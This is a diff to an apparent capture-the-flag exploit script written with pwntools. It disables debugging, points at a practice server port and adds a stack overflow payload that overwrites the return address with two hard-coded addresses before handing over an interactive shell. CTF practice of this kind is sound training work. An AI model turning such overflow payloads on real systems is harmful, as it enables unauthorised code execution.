@@ -2,8 +2,8 @@ from pwn import *
 from pwn import p64
 
 
-debug = 1
-gdb_is = 1
+debug = 0
+gdb_is = 0
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
@@ -11,19 +11,20 @@ if debug:
     r = process("./pwn")
 else:
     host = "node4.buuoj.cn"
-    r = connect(host,30709)#远程连接
+    r = connect(host,27219)#远程连接
     gdb_is =0
 
 if gdb_is:
-    # gdb.attach(r,'b* 0x4012ed')
-    gdb.attach(r)
+    gdb.attach(r,'b* 0x4007a2')
+    # gdb.attach(r)
     pause()
     pass
 
 # libc = ELF('./libc-2.31.so')
 # elf = ELF('./vuln')
 
-# r.sendlineafter()
-# r.send()
-# r.recvuntil()
+r.sendlineafter(b'name:',b'100')
+payload = b'A'*0x10 + b'junkjunk' +p64(0x0400561) +p64(0x04006E6)
+r.sendafter(b'name?',payload)
+
 r.interactive()
